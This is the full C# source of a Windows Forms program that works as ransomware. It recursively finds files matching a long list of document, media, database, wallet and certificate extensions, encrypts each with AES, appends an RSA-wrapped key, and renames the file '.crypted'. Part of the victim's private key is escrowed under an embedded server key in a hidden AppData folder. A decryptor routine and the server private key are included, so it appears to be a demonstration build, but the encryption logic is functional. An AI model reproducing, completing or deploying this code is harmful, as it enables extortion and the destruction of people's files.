using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Security;

namespace WindowsFormsApplication1
{    
    public partial class Form1 : Form
    {
        System.Security.Cryptography.RSAParameters cli_pri;
        System.Security.Cryptography.RSAParameters cli_pub;

        string clientpublickey;
        string clientprivatekey; 

        byte[] unsolved;
        byte[] unsolved2;

        public string filelocation = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        public const string serverpublickey = "<?xml version='1.0' encoding='unicode'?><RSAParameters xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' xmlns:xsd='http://www.w3.org/2001/XMLSchema'><Exponent>AQAB</Exponent><Modulus>v5ozieFEHIeojBrc0pSEsv3I3i1jTxwSJIVeJ4P2X0M7hs3Rmr18CbDgaXMeAgyjF4hShMv2k6Db024+jvhHl6rUs4zfPsAlVd4GXvq4dLXdad8J8PmN/UrpbtS9rOvphY/CCEYjSrB8XQuf7TBTKl2WT/94/5gSuAI3DLEUe1KRvWTH1/bzvZSBCHI5nTII1HtTBUw+pP52ZGfGXJPn3Kp2wzdpjszREkNwenZHyL5+UIRnGq2y8+Gq3vvUysjLYyrF+PI/RfkPakdGhPP2BDse0topKHp6+mQn0cZt+NvzTbmBJXMvschMkZ8E+6xIzMNzXbebu+/QnPzjpQXGkQ==</Modulus></RSAParameters>";
        
        public RSAParameters ser_pub;

        public DateTime start;
        public DateTime end;

        //
        public const string serverprivatekey = "<?xml version='1.0' encoding='unicode'?><RSAParameters xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' xmlns:xsd='http://www.w3.org/2001/XMLSchema'><Exponent>AQAB</Exponent><Modulus>v5ozieFEHIeojBrc0pSEsv3I3i1jTxwSJIVeJ4P2X0M7hs3Rmr18CbDgaXMeAgyjF4hShMv2k6Db024+jvhHl6rUs4zfPsAlVd4GXvq4dLXdad8J8PmN/UrpbtS9rOvphY/CCEYjSrB8XQuf7TBTKl2WT/94/5gSuAI3DLEUe1KRvWTH1/bzvZSBCHI5nTII1HtTBUw+pP52ZGfGXJPn3Kp2wzdpjszREkNwenZHyL5+UIRnGq2y8+Gq3vvUysjLYyrF+PI/RfkPakdGhPP2BDse0topKHp6+mQn0cZt+NvzTbmBJXMvschMkZ8E+6xIzMNzXbebu+/QnPzjpQXGkQ==</Modulus><P>9BtT8tu2IHUWBEL47Tx3zLnKVWZdtQpoYGNZeHjFEvfbM4RatpW3mIapA5lYLlRaEIhuSTFu6NaLqj5x0Qj+0hSo4bjVRYYt/vrQjgtFsemyBMEH6SFioZFIg4beAumTpRdcViAQQwleTxU/H0qqPHlgevmc87b9nQUK4oR/OgM=</P><Q>yPAAWZurD6RI+bmBNUzTEKxUAyCyigy9L9nEWbsF4uTegujN/6wSdNUZn62YF0mRqk5CBSuQzUxWHmXWBdnnVKaOp6gC3quMu8XL3GLSr9R8p6/o3enh4zSb0wJG+7sKTjctWh88uwARH/5r+zj+h0Vrw3/jmCoPFiAnfgP+Yts=</Q><DP>B+wnIletJoqGR2chCxoOTU+uWG01F14aGx6+VaGdy8rNi3N9OjXLuqCMNbixWveT4Lt80NVQ4y+rYsAaE422L31KKeFE0rfTIFZllGabQXXzOCJHrnJN8C516wbih7eq+g2zCnyJ6pMQQ4LOBKb4tXO/BN67EFHdE06JluZz9p8=</DP><DQ>QTVBp9LQzJ6v3/rHZ5iq1jpWeT1fM1W2/5RYGBaNbnh/jVQnpdUdmDSfwCYBuWzyjKYg3rSopTckq3C45+UzIVF78gSgCcr6POWPptGbNdxrJ6/6jimcWLN17iBLEN4+FevqF9kTSExZQly6hiiU0SlCM4uJPJRJmRCOQGLjZwk=</DQ><InverseQ>GK+9ZfWVzcHu3FjRjbkcfv2mmbBTclV5m5L8E/qSgInlt+/lE6lfojwR3Da3aIKg0SZD27o2TIYa5Oq4GB86qgGexFdSyHffehqtAN7uqKSw3+7nN1kuolkvGBWIbDuufbiZWwEjmsHG0Vfmrjo5EuWphG5eXasu9Z6nD1BT594=</InverseQ><D>CTljWM4Rz61oqMVHgBKeKHKj8uCzHFhihGqW47nsW9EdsqA1aPwAidDmBOQByLrfnfiDDH/RqteYLayFi3yz3Nitei8CgmYquS11F6mw+EFwwhhdEkJZZ4PUC1dnm3iu2q5W+ruYFsNUJ81kkVbKi8p+O/Mb83LyF8GKvlKTuCbmKBc3pI8603l8cFBgMz+YuizBjHk9lN0hbp787hSHStL5PeT7e24lV1bWsJY3g+TdfBlNzzfrAqU6OKkSRLfteGTZgNl+fnHmKCLtivyR11hH23BEBNoxTha6aYMIHCfXkes1GEqaomgUBblliz1g8JEU269nVOdEZtBGxQVf7w==</D></RSAParameters>";
        public RSAParameters ser_pri;




        public Form1()
        {
            InitializeComponent();
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            System.Threading.Thread.CurrentThread.CurrentUICulture = new System.Globalization.CultureInfo("En");


            var csp = new RSACryptoServiceProvider(2048);

            cli_pri = csp.ExportParameters(true);
            cli_pub = csp.ExportParameters(false);

            clientpublickey  = Rsaconverter2(cli_pub);
            clientprivatekey = Rsaconverter2(cli_pri);

           

            ser_pub = Rsaconverter(serverpublickey);


            var directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var filelocation  = Path.Combine(directory, Path.Combine("hiddenkey", "public.pxp"));
            var filelocation2 = Path.Combine(directory, Path.Combine("hiddenkey", "private.pxp"));
            var filelocation3 = Path.Combine(directory, Path.Combine("hiddenkey", "private2.pxp"));

            if (File.Exists(filelocation))
            {
                clientpublickey = File.ReadAllText(filelocation,Encoding.Unicode);
                cli_pub = Rsaconverter(clientpublickey);

                unsolved = File.ReadAllBytes(filelocation2);
                unsolved2 = File.ReadAllBytes(filelocation3);
             
            }else{
                Directory.CreateDirectory(Path.Combine(directory, "hiddenkey"));

                File.WriteAllText(filelocation, clientpublickey, Encoding.Unicode);

                Clipboard.SetText(clientprivatekey);
                unsolved = Encoding.Unicode.GetBytes(clientprivatekey.Substring(0, clientprivatekey.Length - 100));

                unsolved2 = RsaCryptor(Encoding.Unicode.GetBytes(clientprivatekey.Substring(clientprivatekey.Length - 100, 100)), ser_pub);

                File.WriteAllBytes(filelocation2, unsolved);
                File.WriteAllBytes(filelocation3, unsolved2);

                cli_pri = new RSAParameters();
                clientprivatekey = null;
            }

            textBox3.Text = Convert.ToBase64String(unsolved2).Replace("+","*");
                

            //
            ser_pri = Rsaconverter(serverprivatekey);


        }



        public RSAParameters Rsaconverter(string input) {
            var strreader = new System.IO.StringReader(input);
            var xs = new System.Xml.Serialization.XmlSerializer(typeof(RSAParameters));
            return (RSAParameters)xs.Deserialize(strreader);
        }

        public string Rsaconverter2(RSAParameters input)
        {
            var sw = new System.IO.StringWriter();
            var xs = new System.Xml.Serialization.XmlSerializer(typeof(RSAParameters));
            xs.Serialize(sw, input);
            return sw.ToString();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string path = textBox1.Text + "/";
            start = DateTime.Now;

            Getfile(path);

            end = DateTime.Now;

            MessageBox.Show((end - start).ToString());
        }

        public  byte[] RsaCryptor(byte[] input,RSAParameters thekey)
        {
            try
            {
                    var csp = new RSACryptoServiceProvider();
                    csp.ImportParameters(thekey);

                    var output = csp.Encrypt(input, false);
                    return output;
            }
            catch (CryptographicException e)
            {
                var zerokey = new byte[] { 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20 };
                return zerokey;
            }
        }

        public byte[] RsaDecryptor(byte[] input, RSAParameters thekey)
        {
            try
            {
                var csp = new RSACryptoServiceProvider();
                csp.ImportParameters(thekey);

                var output = csp.Decrypt(input, false);
                return output;
            }
            catch (CryptographicException e)
            {
                Console.WriteLine(e.Message);
                var zerokey = new byte[] { 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20 };
                return zerokey;
            }
        }

        public static byte[] AES_Encrypt(byte[] inputbytes, byte[] password)
        {

            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 2, 1, 4, 3, 7, 8, 6, 5 };

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(password, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(inputbytes, 0, inputbytes.Length);
                        cs.Close();
                    }

                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        public byte[] AES_Decrypt(byte[] outputbytes, byte[] password)
        {
            byte[] decryptedBytes = null;
            byte[] saltBytes = new byte[] { 2, 1, 4, 3, 7, 8, 6, 5 };

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(password, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;
                    AES.Padding = PaddingMode.None;

                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(outputbytes, 0, outputbytes.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }

            return decryptedBytes;
        }



        public void Getfile(string path)
        {
            string filepath = path;
            string path2 = path + "/log";
            DirectoryInfo d = new DirectoryInfo(filepath);

            string myExtensions = ".jpg.mp3.0.1.1st.2bp.3dm.3ds.sql.mp4.7z.rar.m4a.wma.avi.wmv.csv.d3dbsp.zip.sie.sum.ibank.t13.t12.qdf.gdb.tax.pkpass.bc6.bc7.bkp.qic.bkf.sidn.sidd.mddata.itl.itdb.icxs.hvpl.hplg.hkdb.mdbackup.syncdb.gho.cas.svg.map.wmo.itm.sb.fos.mov.vdf.ztmp.sis.sid.ncf.menu.layout.dmp.blob.esm.vcf.vtf.dazip.fpk.mlx.kf.iwd.vpk.tor.psk.rim.w3x.fsh.ntl.arch00.lvl.snx.cfr.ff.vpp_pc.lrf.m2.mcmeta.vfs0.mpqge.kdb.db0.dba.rofl.hkx.bar.upk.das.iwi.litemod.asset.forge.ltx.bsa.apk.re4.sav.lbf.slm.bik.epk.rgss3a.pak.big, wallet.wotreplay.xxx.desc.py.m3u.flv.js.css.rb.png.jpeg.txt.p7c.p7b.p12.pfx.pem.crt.cer.der.x3f.srw.pef.ptx.r3d.rw2.rwl.raw.raf.orf.nrw.mrwref.mef.erf.kdc.dcr.cr2.crw.bay.sr2.srf.arw.3fr.dng.jpe.jpg.cdr.indd.ai.eps.pdf.pdd.psd.dbf.mdf.wb2.rtf.wpd.dxg.xf.dwg.pst.accdb.mdb.pptm.pptx.ppt.xlk.xlsb.xlsm.xlsx.xls.wps.docm.docx.doc.odb.odc.odm.odp.ods.odt.wav.wbc.wbd.wbk.wbm.wbmp.wbz.wcf.wdb.wdp.webdoc.webp.wgz.wire.wm.wma.wmd.wmf.wmv.wn.wot.wp.wp4.wp5.wp6.wp7.wpa.wpb.wpd.wpe.wpg.wpl.wps.wpt.wpw.wri.ws.wsc.wsd.wsh.x.x3d.x3f.xar.xbdoc.xbplate.xdb.xdl.xld.xlgc.xll.xls.xlsm.xlsx.xmind.xml.xmmap.xpm.xwp.xx.xy3.xyp.xyw.y.yal.ybk.yml.ysp.z.z3d.zabw.zdb.zdc.zi.zif.zip.zw.pdf";

            foreach (var file in d.GetFiles("*", SearchOption.AllDirectories))
            {
                if (myExtensions.ToLower().Contains(file.Extension.ToLower()))
                {
                    try
                    {
                        if (!File.Exists(path2))
                        {
                            using (StreamWriter sw = File.CreateText(path2))
                            {
                                sw.WriteLine(file.FullName + "\n");
                            }
                        }
                        else
                        {
                            using (StreamWriter sr = File.AppendText(path2))
                            {
                                sr.WriteLine(file.FullName + "\n");
                                sr.Close();
                            }
                        }

                            Random rnd = new Random();
                            Byte[] aeskey = new Byte[10];
                            rnd.NextBytes(aeskey);

                            Byte[] rsa_key = RsaCryptor(aeskey, cli_pub);

                            byte[] buff = File.ReadAllBytes(file.FullName);
                            Array.Resize(ref buff, buff.Length + rsa_key.Length);

                            buff = AES_Encrypt(buff, aeskey);

                            var counter = 0;
                            for (int i = buff.Length - rsa_key.Length; i < buff.Length; i++)
                            {

                                buff[i] = rsa_key[counter];
                                counter++;
                            }


                            
                            try
                            {
                                File.WriteAllBytes(file.FullName, buff);

                                System.IO.File.Move(file.FullName, file.FullName + ".crypted");

                            }
                            catch (Exception e)
                            {
                            }

                    }
                    catch (Exception e) { 
                    }

                }
            }

        }


        public void Getfile2(string path)
        {
            DirectoryInfo d = new DirectoryInfo(path);

            foreach (var file in d.GetFiles("*", SearchOption.AllDirectories))
            {
                if (file.Name.Contains(".crypted"))
                {
                    //try
                    //{
                        Byte[] raw_file = File.ReadAllBytes(file.FullName);
                        Byte[] extracted_key = new Byte[256];

                        for (int i = 0; i < 256; i++)
                        {
                            extracted_key[i] = raw_file[raw_file.Length - 256 + i];
                        }
                        clientprivatekey = Encoding.Unicode.GetString(unsolved) + Encoding.Unicode.GetString(Convert.FromBase64String(textBox2.Text.Replace("*", "+")));
                        cli_pri = Rsaconverter(clientprivatekey);
                        Byte[] aeskey = RsaDecryptor(extracted_key, cli_pri);

                        byte[] buff = new byte[raw_file.Length - 256];

                        for (int i = 0; i < raw_file.Length - 256; i++)
                        {
                            buff[i] = raw_file[i];
                        }

                        Byte[] getbuff = AES_Decrypt(buff, aeskey);

                        File.WriteAllBytes(file.FullName, getbuff);

                        System.IO.File.Move(file.FullName, file.FullName.Replace(".crypted", ""));
                    }
                /*catch (Exception e)
                { 
                    MessageBox.Show(e.ToString());
                }
                }*/
            }

         }

        private void button2_Click(object sender, EventArgs e)
        {
            var address = textBox1.Text;
            Getfile2(address);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            var key = Convert.FromBase64String(textBox4.Text.Replace("*", "+"));
            var result = Convert.ToBase64String(RsaDecryptor(key, ser_pri)).Replace("+", "*");
            textBox6.Text = result;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog fbd = new FolderBrowserDialog();
            if (fbd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                textBox1.Text = fbd.SelectedPath;
        }



    }
}